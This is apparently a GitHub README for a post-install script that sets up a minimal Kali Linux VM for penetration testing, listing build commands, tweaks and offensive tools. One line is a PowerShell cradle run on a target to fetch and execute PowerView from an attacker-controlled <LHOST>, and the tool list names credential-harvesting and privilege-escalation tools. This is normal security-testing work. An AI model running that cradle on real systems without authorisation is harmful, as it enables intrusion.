# Kali-Clean

![screenshot](./images/screenshot.png?raw=true)

[xct/kali-clean](https://github.com/xct/kali-clean) with personal tweaks and borrowed ideas from [islanddog/kali-clean-pwnbox](https://github.com/islanddog/kali-clean-pwnbox).

This post-installation script is intended to be used on minimal Kali VM with no tools. I used [the official VM build script](https://gitlab.com/kalilinux/build-scripts/kali-vm) with the following options to get started. It should still work fine on a bare metal installation.

```
./build.sh -v vmware -D none -Z $(cat /etc/timezone) -T none -P "network-manager curl neovim"

# alternatively
./build.sh -v qemu -D none -Z $(cat /etc/timezone) -T none -P "network-manager curl neovim"
```

If you are building on a Windows machine:

- you will need WSL2
- install docker in WSL2

```
# confirm you are running WSL2
wsl --version

# start the docker service
sudo systemctl start docker

# continue building your kali VM
./build-in-container.sh -v vmware -D none -Z $(cat /etc/timezone) -T none -P "network-manager curl neovim"

# copy from WSL to your Windows host (eg. Downloads folder)
cp -r images/kali-linux-rolling-vmware-amd64.vmwarevm /mnt/c/Users/<USER>/Downloads
```

## Installation

```
sudo -sE ./install.sh 2>install.err
```

## QoL Improvements vs default Kali
- Built in cheatsheets using [Navi](https://github.com/denisidoro/navi)
```
navi --print
# alias is 'n'
n
```
- Windows binaries symlinked into Apache webroot
```
# binaries located in /var/www/html/win/
sudo systemctl start apache2
# on target
IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/powerview.ps1")
```
- Modularity: Optional install scripts in `kali-clean/optional_installs/`
```
# example: you want to install python2 for legacy python exploits
# reference: https://www.kali.org/docs/general-use/using-eol-python-versions/
# simply run the following script from the optional_installs folder
./install_python2.sh
```
- IP address of `tun0` is displayed, no need to run `ip a` everytime
- Better firefox profile: Removed default bookmarks, added useful extensions (eg. foxyproxy) and made restore tabs on startup the default.

## TODOs

- move .mozilla to .config/mozilla once ESR reaches 147

## Checkout
Below are things I will get around to trying and will add them to the install script if I find them useful.
- https://github.com/trustedsec/unicorn
- https://github.com/sevagas/macro_pack
- https://github.com/Flangvik/SharpCollection
- https://github.com/bohops/GhostBuild
- https://github.com/AdrianVollmer/PowerHub
- https://github.com/BeichenDream/GodPotato
- https://github.com/antonioCoco/RunasCs
- Note: If using GodPotato, it's easier to create a new admin user and switch to them with RunasCs.
- https://github.com/AlessandroZ/LaZagne or Snaffler
- https://github.com/Azathothas/Toolpacks
- https://github.com/sandialabs/wiretap

## Credit
- https://github.com/AyoItsYas/Mainte
